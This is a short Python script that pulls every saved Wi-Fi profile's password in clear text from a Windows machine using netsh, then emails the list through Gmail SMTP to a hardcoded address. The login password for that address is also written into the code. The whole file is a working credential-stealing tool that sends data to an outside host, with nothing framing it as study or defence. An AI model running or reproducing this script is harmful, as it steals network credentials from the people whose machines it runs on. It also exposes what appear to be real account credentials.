#!/usr/bin/env python

#import requisite libraries
import subprocess, smtplib, re

def sendMail(email, pwd, msg):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, pwd)
    server.sendmail(email, email, msg)
    server.quit()

cmd = "netsh wlan show profile"
networks = subprocess.check_output(cmd, shell=True)
networkNames = re.findall("(?:Profile\s*:\s)(.*)", networks)

result = ""
for netName in networkNames:
	netNameCMD = cmd + " \"" + netName + "\" key=clear"
	netKeys = subprocess.check_output(netNameCMD, shell=True)
	netKeyClear = re.search("(?:\s*Key\sContent\s*:\s)(.*)", netKeys)
	result = result + netName + "\n"

	if netKeyClear is not None:
		result = result +  "\tPassword: " + netKeyClear.group(1) + "\n"
	else:
		result = result + "\tPassword Not Found"+ "\n"

sendMail("dantekanji@gmail.com", "pr1V4CY2", result)